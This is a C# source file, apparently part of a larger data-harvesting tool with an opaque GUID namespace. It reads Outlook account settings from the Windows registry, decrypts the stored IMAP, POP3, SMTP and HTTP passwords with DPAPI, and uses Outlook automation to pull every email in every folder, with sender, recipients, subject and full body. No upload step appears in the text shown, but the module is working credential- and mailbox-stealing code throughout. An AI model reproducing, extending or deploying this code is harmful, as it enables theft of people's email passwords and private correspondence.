using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using MSOutlook = Microsoft.Office.Interop.Outlook;
using Microsoft.Win32;

namespace FE3458D878534D9183D79D9318BB08C0.Data
{
	public class Outlook : CDataStructures.Outlook, DataStructures.ISyncData
	{
		#region Properties
		public override CDataStructures.DataTypes.sEmailAccount[] Accounts
		{
			get
			{
				if (this.Disposed)
					throw new ObjectDisposedException(this.GetType().FullName);

				return this.Properties.GetSetProperty<CDataStructures.DataTypes.sEmailAccount[]>("Accounts", this.GetAccounts);
			}
		}

		public override CDataStructures.DataTypes.sEmail[] Emails
		{
			get
			{
				if (this.Disposed)
					throw new ObjectDisposedException(this.GetType().FullName);

				return this.Properties.GetSetProperty<CDataStructures.DataTypes.sEmail[]>("Emails", this.GetEmails);
			}
		}
		#endregion

		#region Methods
		public void Initiate()
		{
			this.Retrieved = DateTime.UtcNow;

			this.Accounts.ToString();
			this.Emails.ToString();
		}

		private CDataStructures.DataTypes.sEmailAccount[] GetAccounts()
		{
			List<CDataStructures.DataTypes.sEmailAccount> rData = new List<CDataStructures.DataTypes.sEmailAccount>();

			try
			{
				using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(Outlook.PasswordRegKey, false))
				{
					if (rk != null)
					{
						foreach (string skName in rk.GetSubKeyNames())
						{
							if (skName.Length != 8)
								continue;

							try
							{
								using (RegistryKey sk = rk.OpenSubKey(skName))
								{
									byte[] Email = sk.GetValue("Email") as byte[];

									if (Email == null)
										continue;

									byte[] DisplayName = sk.GetValue("Display Name") as byte[];
									byte[] DataFile = sk.GetValue("Delivery Store EntryID") as byte[];

									byte[] IMAPUser = sk.GetValue("IMAP User") as byte[];
									byte[] IMAPPassword = sk.GetValue("IMAP Password") as byte[];
									byte[] IMAPServer = sk.GetValue("IMAP Server") as byte[];
									int? IMAPPort = sk.GetValue("IMAP Port") as int?;

									byte[] POP3User = sk.GetValue("POP3 User") as byte[];
									byte[] POP3Password = sk.GetValue("POP3 Password") as byte[];
									byte[] POP3Server = sk.GetValue("POP3 Server") as byte[];
									int? POP3Port = sk.GetValue("POP3 Port") as int?;
									int? POP3UseSSL = sk.GetValue("POP3 Use SSL") as int?;

									byte[] HTTPUser = sk.GetValue("HTTP User") as byte[];
									byte[] HTTPPassword = sk.GetValue("HTTP Password") as byte[];
									byte[] HTTPServer = sk.GetValue("HTTP Server URL") as byte[];

									byte[] SMTPUser = sk.GetValue("SMTP User") as byte[];
									byte[] SMTPPassword = sk.GetValue("SMTP Password") as byte[];
									int? SMTPSecureConnection = sk.GetValue("SMTP Secure Connection") as int?;
									byte[] SMTPServer = sk.GetValue("SMTP Server") as byte[];
									int? SMTPPort = sk.GetValue("SMTP Port") as int?;
									int? SMTPUseAuth = sk.GetValue("SMTP Use Auth") as int?;

									Uri TempUri;
									rData.Add(new CDataStructures.DataTypes.sEmailAccount
									{
										DataFile = (DataFile != null) ? this.GetString(DataFile, 27) : null,
										DisplayName = (DisplayName != null) ? this.GetString(DisplayName) : null,
										Email = this.GetString(Email),
										HTTPPassword = (HTTPPassword != null) ? this.DecryptPassword(HTTPPassword) : null,
										HTTPServer = (HTTPServer != null && Uri.TryCreate(this.GetString(HTTPServer), UriKind.Absolute, out TempUri)) ? TempUri : null,
										HTTPUser = (HTTPUser != null) ? this.GetString(HTTPUser) : null,
										IMAPPassword = (IMAPPassword != null) ? this.DecryptPassword(IMAPPassword) : null,
										IMAPPort = IMAPPort.HasValue ? IMAPPort.Value : 0,
										IMAPServer = (IMAPServer != null) ? this.GetString(IMAPServer) : null,
										IMAPUser = (IMAPUser != null) ? this.GetString(IMAPUser) : null,
										POP3Password = (POP3Password != null) ? this.DecryptPassword(POP3Password) : null,
										POP3Port = POP3Port.HasValue ? POP3Port.Value : 0,
										POP3Server = (POP3Server != null) ? this.GetString(POP3Server) : null,
										POP3UseSSL = (POP3UseSSL == 1),
										POP3User = (POP3User != null) ? this.GetString(POP3User) : null,
										SMTPPassword = (SMTPPassword != null) ? this.DecryptPassword(SMTPPassword) : null,
										SMTPPort = SMTPPort.HasValue ? SMTPPort.Value : 0,
										SMTPSecureConnection = (SMTPSecureConnection == 1),
										SMTPServer = (SMTPServer != null) ? this.GetString(SMTPServer) : null,
										SMTPUser = (SMTPUser != null) ? this.GetString(SMTPUser) : null,
										SMTPUseAuth = (SMTPUseAuth == 1)
									});

									TempUri = null;
									Email = null;
									DataFile = null;
									DisplayName = null;
									HTTPPassword = null;
									HTTPServer = null;
									HTTPUser = null;
									IMAPPassword = null;
									IMAPServer = null;
									IMAPUser = null;
									POP3Password = null;
									POP3Server = null;
									POP3User = null;
									SMTPPassword = null;
									SMTPServer = null;
									SMTPUser = null;
								}
							}
							catch (Exception e)
							{
								Utilities.Log(e);
							}
						}
					}
				}
			}
			catch (Exception e)
			{
				Utilities.Log(e);
			}

			return rData.Distinct().ToArray();
		}

		private CDataStructures.DataTypes.sEmail[] GetEmails()
		{
			List<CDataStructures.DataTypes.sEmail> rData = new List<CDataStructures.DataTypes.sEmail>();

			foreach (CDataStructures.DataTypes.sEmailAccount Account in this.Accounts)
			{
				if (!File.Exists(Account.DataFile))
					continue;

				MSOutlook.Application Application = null;
				MSOutlook.NameSpace OutlookNS = null;

				try
				{
					Application = new MSOutlook.Application();
					OutlookNS = Application.GetNamespace("MAPI");
					OutlookNS.AddStore(Account.DataFile);

					foreach (MSOutlook.Store Store in OutlookNS.Stores)
					{
						MSOutlook.MAPIFolder RootFolder = null;

						try
						{
							RootFolder = Store.GetRootFolder();

							foreach (MSOutlook.Folder Folder in RootFolder.Folders)
							{
								try
								{
									foreach (object _Item in Folder.Items)
									{
										MSOutlook.MailItem Item = _Item as MSOutlook.MailItem;

										try
										{
											if (Item != null)
											{
												List<string> Recipients = new List<string>();

												try
												{
													foreach (MSOutlook.Recipient Recipient in Item.Recipients)
													{
														try
														{
															Recipients.Add(Recipient.Address);
														}
														catch (Exception e)
														{
															Utilities.Log(e);
														}
														finally
														{
															if (Recipient != null)
																Marshal.ReleaseComObject(Recipient);
														}
													}
												}
												catch (Exception e)
												{
													Utilities.Log(e);
												}
												finally
												{
													if (Item.Recipients != null)
														Marshal.ReleaseComObject(Item.Recipients);
												}

												string Body = Item.HTMLBody;
												string TempFile = null;

												try
												{
													if (Item.Attachments.Count > 0)
													{
														TempFile = Path.GetTempFileName();
														Item.SaveAs(TempFile, MSOutlook.OlSaveAsType.olMHTML);
														Body = File.ReadAllText(TempFile);
													}
												}
												catch (Exception e)
												{
													Utilities.Log(e);
												}
												finally
												{
													if (TempFile != null)
														File.Delete(TempFile);

													if (Item.Attachments != null)
														Marshal.ReleaseComObject(Item.Attachments);
												}

												rData.Add(new CDataStructures.DataTypes.sEmail
												{
													Body = Body,
													From = Item.SenderEmailAddress,
													Folder = Folder.Name,
													Profile = Account.Email,
													Received = Item.ReceivedTime,
													Subject = Item.Subject,
													To = Recipients.ToArray()
												});
											}
										}
										catch (Exception e)
										{
											Utilities.Log(e);
										}
										finally
										{
											if (Item != null)
												Marshal.ReleaseComObject(Item);

											if (_Item != null)
												Marshal.ReleaseComObject(_Item);
										}
									}
								}
								catch (Exception e)
								{
									Utilities.Log(e);
								}
								finally
								{
									if (Folder != null)
									{
										if (Folder.Items != null)
											Marshal.ReleaseComObject(Folder.Items);

										Marshal.ReleaseComObject(Folder);
									}
								}
							}
						}
						catch (Exception e)
						{
							Utilities.Log(e);
						}
						finally
						{
							if (RootFolder != null)
							{
								if (RootFolder.Folders != null)
									Marshal.ReleaseComObject(RootFolder.Folders);

								Marshal.ReleaseComObject(RootFolder);
							}

							if (Store != null)
								Marshal.ReleaseComObject(Store);
						}
					}
				}
				catch (Exception e)
				{
					Utilities.Log(e);
				}
				finally
				{
					if (OutlookNS != null)
					{
						if (OutlookNS.Stores != null)
							Marshal.ReleaseComObject(OutlookNS.Stores);

						Marshal.ReleaseComObject(OutlookNS);
					}

					if (Application != null)
					{
						((MSOutlook._Application)Application).Quit();
						Marshal.ReleaseComObject(Application);
					}
				}
			}

			return rData.Distinct().ToArray();
		}

		private string GetString(byte[] In)
		{
			if (Outlook.RegEncoding.IsSingleByte)
				return Outlook.RegEncoding.GetString(In, 0, In.Length - 1);
			else
				return Outlook.RegEncoding.GetString(In, 0, In.Length - 2);
		}

		private string GetString(byte[] In, int Index)
		{
			if (Outlook.RegEncoding.IsSingleByte)
				return Outlook.RegEncoding.GetString(In, Index, In.Length - Index - 1);
			else
			{
				Index *= 2;
				return Outlook.RegEncoding.GetString(In, Index, In.Length - Index - 2);
			}
		}
		#endregion

		#region PasswordDependancies
		private string DecryptPassword(byte[] EncPassword)
		{
			try
			{
				byte[] Data = new byte[EncPassword.Length - 1];
				Buffer.BlockCopy(EncPassword, 1, Data, 0, Data.Length);

				switch (EncPassword[0])
				{
					case 1:
						throw new NotSupportedException("Windows Protected Storage is not supported.");
					case 2:
						return this.GetString(ProtectedData.Unprotect(Data, null, DataProtectionScope.CurrentUser));
					default:
						throw new NotSupportedException("The type of encryption specified in EncPassword[0] is not supported.");
				}
			}
			catch (Exception e)
			{
				Utilities.Log(e);
				return null;
			}
		}

		private const string PasswordRegKey = @"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676";
		#endregion

		private static readonly Encoding RegEncoding = Encoding.Unicode;
	}
}